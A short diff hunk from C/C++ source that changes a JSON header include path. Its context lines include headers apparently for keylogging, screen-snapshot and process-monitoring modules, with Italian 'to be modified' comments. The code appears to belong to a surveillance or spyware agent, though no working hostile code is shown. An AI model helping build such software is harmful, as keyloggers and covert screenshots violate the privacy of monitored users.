@@ -113,7 +113,7 @@ void HM_U2A(char *buffer);
 void LockConfFile();
 void UnlockConfFile();
 
-#include "JSON\JSON.h"
+#include <json/JSON.h>
 #include "HM_ProcessMonitors.h" // XXX da modificare
 #include "HM_KeyLog.h" // XXX da modificare
 #include "HM_SnapShot.h" // XXX da modificare
